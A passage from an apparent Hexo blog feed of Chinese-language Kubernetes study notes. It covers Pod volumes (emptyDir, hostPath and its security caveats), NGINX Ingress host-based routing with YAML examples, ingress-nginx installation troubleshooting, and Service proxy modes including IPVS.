class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test-pd-multi-docker</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">wangyanglinux/myapp:v1</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">test-container</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/cache</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">cache-volume</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">tomcat</span><br>    <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">IfNotPresent</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">container-tomcat</span><br>    <span class="hljs-attr">ports:</span><br>     <span class="hljs-comment"># containerPort 在一个pod中不能重复。另外需要于实际的镜像tomcat: 8080匹配，</span><br>     <span class="hljs-comment"># 不然无法通过# readness检测。</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">8080</span>    <br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span> <span class="hljs-comment"># 挂载路径不同，但是挂载的卷相同，实际上是操作同一个逻辑存储位置的文件。</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">cache-volume</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">cache-volume</span><br>    <span class="hljs-attr">emptyDir:</span> &#123;&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-2-hostPath"><a href="#2-2-hostPath" class="headerlink" title="2.2 hostPath"></a>2.2 hostPath</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--hostPath 用于实际的挂载NODE节点的逻辑存储空间。 这种方式，可以对外部的网络共享存储，</span><br><span class="hljs-comment">以及其他的一切可以映射到NODE上的存储空间进行挂载。--&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">pd-hostpath-volume</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">test-container</span><br>    <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">IfNotPresent</span>   <br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test-pd</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-volume</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-comment"># 宿主上目录位置</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/data</span><br>      <span class="hljs-comment"># 此字段为可选</span><br>      <span class="hljs-attr">type:</span> <span class="hljs-string">Directory</span><br><br></code></pre></td></tr></table></figure><h4 id="2-2-1-hostPath-使用注意事项"><a href="#2-2-1-hostPath-使用注意事项" class="headerlink" title="2.2.1 hostPath 使用注意事项"></a>2.2.1 hostPath 使用注意事项</h4><pre><code>1,  警告：HostPath 卷存在许多安全风险，最佳做法是尽可能避免使用 HostPath。 当必须使用 HostPath 卷时，它的范围应仅限于所需的文件或目录，并以只读方式挂载。    如果通过 AdmissionPolicy 限制 HostPath 对特定目录的访问， 则必须要求 volumeMounts使用 readOnly 挂载以使策略生效。</code></pre>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"> <span class="hljs-comment">&lt;!--  当使用这种类型的卷时要小心，因为：</span><br><span class="hljs-comment">1, HostPath 卷可能会暴露特权系统凭据（例如 Kubelet）或特权 API（例如容器运行时套接字）， 可用于容器逃逸或攻击集群的其他部分。</span><br><span class="hljs-comment">2,具有相同配置（例如基于同一 PodTemplate 创建）的多个 Pod 会由于节点上文件的不同 而在不同节点上有不同的行为。</span><br><span class="hljs-comment">3,下层主机上创建的文件或目录只能由 root 用户写入。你需要在 特权容器 中以 root 身份运行进程，或者修改主机上的文件权限以便器能够写入 hostPath 卷。   --&gt;</span><br></code></pre></td></tr></table></figure><p><a href="/Volume/20211115045035691.png" class="gallery-item"><img src="/2021/11/15/Volume/20211115045035691.png"></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 以上报错原因，是因为/data目录不能存在所有的Node 节点上。  Master 节点反而不需要建立此目录 --&gt;</span><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NGINX Ingress Controller 使用指引</title>
      <link href="/2021/11/11/NGINX%20Ingress%20Controller%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%BC%95/"/>
      <url>/2021/11/11/NGINX%20Ingress%20Controller%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="Basic-usage-host-based-routing"><a href="#Basic-usage-host-based-routing" class="headerlink" title="Basic usage - host based routing"></a>Basic usage - host based routing<p>ingress-nginx can be used for many use cases, inside various cloud provider and supports a lot of configurations. In this section you can find a common usage scenario where a single load balancer powered by ingress-nginx will route traffic to 2 different HTTP backend services based on the host name.</p><p>First of all follow the instructions to install ingress-nginx. Then imagine that you need to expose 2 HTTP services already installed, myServiceA, myServiceB, and configured as type: ClusterIP.</p><p>Let’s say that you want to expose the first at myServiceA.foo.org and the second at myServiceB.foo.org.</p><h3 id="If-cluster-version-lt-1-19-you-can-create-two-ingress-resources-like-this"><a href="#If-cluster-version-lt-1-19-you-can-create-two-ingress-resources-like-this" class="headerlink" title="If cluster version &lt; 1.19 you can create two ingress resources like this:"></a>If cluster version &lt; 1.19 you can create two ingress resources like this:</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-myservicea</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">ingressClassName:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">myservicea.foo.org</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>        <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">myservicea</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-myserviceb</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-comment"># use the shared ingress-nginx</span><br>    <span class="hljs-attr">kubernetes.io/ingress.class:</span> <span class="hljs-string">&quot;nginx&quot;</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">myserviceb.foo.org</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>        <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">myserviceb</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br><br><br></code></pre></td></tr></table></figure><h3 id="If-cluster-version-gt-1-19"><a href="#If-cluster-version-gt-1-19" class="headerlink" title="If cluster version &gt;= 1.19"></a>If cluster version &gt;= 1.19</h3><p>the Ingress resource above will not work, instead of annotations you should use the new ingressClassName: nginx property.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-myservicea</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">myservicea.foo.org</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>        <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">myservicea</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br>  <span class="hljs-attr">ingressClassName:</span> <span class="hljs-string">nginx</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">ingress-myserviceb</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">myserviceb.foo.org</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>        <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">myserviceb</span><br>            <span class="hljs-attr">port:</span><br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br>  <span class="hljs-attr">ingressClassName:</span> <span class="hljs-string">nginx</span><br><br><br></code></pre></td></tr></table></figure><p>When you apply this yaml, 2 ingress resources will be created managed by the ingress-nginx instance. Nginx is configured to automatically discover all ingress with the kubernetes.io/ingress.class: “nginx” annotation or where ingressClassName: nginx is present. Please note that the ingress resource should be placed inside the same namespace of the backend resource.</p><p>On many cloud providers ingress-nginx will also create the corresponding Load Balancer resource. All you have to do is get the external IP and add a DNS A record inside your DNS provider that point myservicea.foo.org and myserviceb.foo.org to the nginx external IP. Get the external IP by running:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl get services -n ingress-nginx<br></code></pre></td></tr></table></figure><p><a href="/Ingress-2/20211112054927993.png" class="gallery-item"><img src="/2021/11/11/NGINX%20Ingress%20Controller%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%BC%95/20211112054927993.png"></a><br><a href="/Ingress-2/20211112055002751.png" class="gallery-item"><img src="/2021/11/11/NGINX%20Ingress%20Controller%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%BC%95/20211112055002751.png"></a><br><a href="/Ingress-2/20211112055115475.png" class="gallery-item"><img src="/2021/11/11/NGINX%20Ingress%20Controller%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%BC%95/20211112055115475.png"></a><br><a href="/Ingress-2/20211112055407428.png" class="gallery-item"><img src="/2021/11/11/NGINX%20Ingress%20Controller%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%BC%95/20211112055407428.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ingress</title>
      <link href="/2021/11/11/Ingress/"/>
      <url>/2021/11/11/Ingress/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="Ingress"><a href="#Ingress" class="headerlink" title="Ingress?"></a>Ingress?<p><font color="green" siez="2">根据IT领域存在即意义的尿性，有了service 对于Pod的负载均衡后，为什么还搞一个Ingress 做负载均衡？个人理解：</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. service 实现的是4层的负载均衡，而 Ingress 实现的是7层负载均衡。<br>2. 唉，其实第一点就讲完了。<br>3. 废话下，Ingress 在7层可以干很多事情。 基于URL做不同Service 转发  【微服务应用场景】<br>4. 终止 SSL/TLS 【Pod内部不需要配SSL证书】&#123;省事&#125;<br>5. 提供基于名称的虚拟主机 【来自kubernets.io 我也没太清楚是啥意思，后面补充。】<br></code></pre></td></tr></table></figure><h4 id="Ingress安全性描述："><a href="#Ingress安全性描述：" class="headerlink" title="Ingress安全性描述："></a>Ingress安全性描述：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">Ingress 不会公开任意端口或协议。 将 HTTP 和 HTTPS 以外的服务公开到 Internet 时，<br>通常使用 Service.Type=NodePort 或 Service.Type=LoadBalancer 类型的服务。<br>也就是说Ingress在Service 的基础上不会引入新的脆弱性问题。【源码引入的安全性漏洞除外】<br><br></code></pre></td></tr></table></figure><h4 id="Ingress-拓扑"><a href="#Ingress-拓扑" class="headerlink" title="Ingress 拓扑"></a>Ingress 拓扑</h4><p><a href="/Ingress/20211109045613919.png" class="gallery-item"><img src="/2021/11/11/Ingress/20211109045613919.png"></a></p><h4 id="Igress-nginx-nginx-管理器实现模式"><a href="#Igress-nginx-nginx-管理器实现模式" class="headerlink" title="Igress-nginx nginx 管理器实现模式"></a>Igress-nginx nginx 管理器实现模式</h4><p><a href="/Ingress/20211111095416954.png" class="gallery-item"><img src="/2021/11/11/Ingress/20211111095416954.png"></a><br><a href="/Ingress/20211111095601284.png" class="gallery-item"><img src="/2021/11/11/Ingress/20211111095601284.png"></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">ingress-nginx 官网 <br></code></pre></td></tr></table></figure><pre><code>https://kubernetes.github.io/ingress-nginx/</code></pre><h4 id="Igress-nginx-deployment"><a href="#Igress-nginx-deployment" class="headerlink" title="Igress-nginx deployment"></a>Igress-nginx deployment</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">https://kubernetes.github.io/ingress-nginx/deploy/<br><span class="hljs-meta">#</span><span class="bash"> 具体的版本去官网看。 不同的版本变更有一些不同。例如 v1.19 是一个大的版本变更。很多yaml格式都有变化。</span><br>kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.0.4/deploy/static/provider/cloud/deploy.yaml<br><span class="hljs-meta">#</span><span class="bash"> Using NodePort:</span><br>kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.0.4/deploy/static/provider/baremetal/deploy.yaml<br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> docker 中删除镜像tag 为 none的镜像</span><br>docker images|grep none|awk &#x27;&#123;print $3&#125;&#x27;|xargs docker rmi<br><br><br></code></pre></td></tr></table></figure><h5 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">Events:<br>  Type     Reason       Age               From                 Message<br>  ----     ------       ----              ----                 -------<br>  Normal   Scheduled    2m1s              default-scheduler    Successfully assigned ingress-nginx/ingress-nginx-controller-7fd7d8df56-wpdnp to k8s-node-1<br>  Warning  FailedMount  57s (x8 over 2m)  kubelet, k8s-node-1  MountVolume.SetUp failed for volume &quot;webhook-cert&quot; : secret &quot;ingress-nginx-admission&quot; not found<br></code></pre></td></tr></table></figure><pre><code>I change the yaml file .secretName: ingress-nginx-admissionsecretName: ingress-nginx-admission-token-l2nx8</code></pre><p><a href="/Ingress/20211111044600469.png" class="gallery-item"><img src="/2021/11/11/Ingress/20211111044600469.png"></a><br>IT can work!!<br><a href="/Ingress/20211111044615988.png" class="gallery-item"><img src="/2021/11/11/Ingress/20211111044615988.png"></a></p><p>add, at the second date .<br>I find a ture answaer, i belive.<br>delete all the svc. pods deployment , secret ,rs, cs, use yaml file when you apply except kube-system namespace<br>like the under.<br>kubectl delete -f <a href="https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.0.4/deploy/static/provider/cloud/deploy.yaml">https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.0.4/deploy/static/provider/cloud/deploy.yaml</a><br>and apply the new<br>kubectl apply -f <a href="https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.0.4/deploy/static/provider/cloud/deploy.yaml">https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.0.4/deploy/static/provider/cloud/deploy.yaml</a><br>and everthing looks like good .<br><a href="/Ingress/20211112052916195.png" class="gallery-item"><img src="/2021/11/11/Ingress/20211112052916195.png"></a><br><a href="/Ingress/20211112052924671.png" class="gallery-item"><img src="/2021/11/11/Ingress/20211112052924671.png"></a></p><h4 id="apiVersion-变更"><a href="#apiVersion-变更" class="headerlink" title="apiVersion 变更"></a>apiVersion 变更</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">Release notes to 1.16.0 state:<br>The following APIs are no longer served by default:<br><br>All resources under apps/v1beta1 and apps/v1beta2 - use apps/v1 instead<br>daemonsets, deployments, replicasets resources under extensions/v1beta1 - use apps/v1 instead<br>networkpolicies resources under extensions/v1beta1 - use networking.k8s.io/v1 instead<br>podsecuritypolicies resources under extensions/v1beta1 - use policy/v1beta1 instead<br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Service 课程笔记</title>
      <link href="/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/"/>
      <url>/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <figure><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">VIP 和 Service 代理<br>1. userspace<br>2. iptables<br>3. ipvs<br>? 为何不用 round-robin DNS?<br> 因为DNS存在缓存现象，很多应用都不会主动去刷新DNS缓存。当Service 代理的POD出现变更后，DNS得不到同步更新。【应用中也会缓存DNS记录】从而造成后端POD代理异常。<br> <br></code></pre></td></tr></table><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Service YAML</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br> <span class="hljs-attr">name:</span> <span class="hljs-string">myapp</span><br> <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br> <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span><span class="hljs-comment">#Cluster IP</span><br> <span class="hljs-attr">selector:</span><span class="hljs-comment">#选择器</span><br>  <span class="hljs-attr">app:</span> <span class="hljs-string">myapp</span>            <span class="hljs-comment">#service匹配标签</span><br>  <span class="hljs-attr">release:</span> <span class="hljs-string">stabel</span>       <span class="hljs-comment">#service匹配标签</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">http</span><span class="hljs-comment">#匹配Deployment.spec.ports名称</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>          <span class="hljs-comment">#暴露端口</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">80</span>    <span class="hljs-comment">#后端真实服务器端口</span><br></code></pre></td></tr></table></figure><p>在最新版本中，默认使用IPVS代理模式。</p><pre><code>. userspace   问题点： kube-proxy 压力过大，流量都经过kube-proxy进行二次转发。</code></pre><p><a href="/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110035305296.png" class="gallery-item"><img src="/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110035305296.png"></a></p><pre><code>. iptables</code></pre><p><a href="/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110035250737.png" class="gallery-item"><img src="/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110035250737.png"></a></p><pre><code>. ipvs</code></pre><p><a href="/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110035234916.png" class="gallery-item"><img src="/2021/11/10/Service%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0_%E5%B0%9A%E7%A1%85%E8%B0%B7IT%E5%9F%B9%E8%AE%AD/20211110035234916.png"></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">ipvs 模块运行在假定 NODE节点安装IPVS 内核模块。 如果未安装，那么kube-proxy 将退回到iptables 代理模式下运行。</span><br><span class="hljs-comment">--&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipvsadm -Ln 查看 ipvs 代理方式<br><br></code></pre></td></tr></table></figure><h1 id="IPVS-代理模式的实现"><a href="#IPVS-代理模式的实现" class="headerlink" title="IPVS 代理模式的实现"></a>IPVS 代理模式的实现</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--听课的时候说，新版本的kubernetes 默认采用ipvs的方式。但是事实上我的环境 是v1.22.3 最新的版本，</span><br><span class="hljs-comment">然而node支持IPVS的情况下 ，IPVS并未开启。 IPVS的开启是需要配置的。</span><br></code></pre></td></tr></table></figure><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><h5 id="在所有的Node节点上配置IPVS支持。"><a href="#在所有的Node节点上配置IPVS支持。" class="headerlink" title="在所有的Node节点上配置IPVS支持。"></a>在所有的Node节点上配置IPVS支持。</h5><figure class="highlight 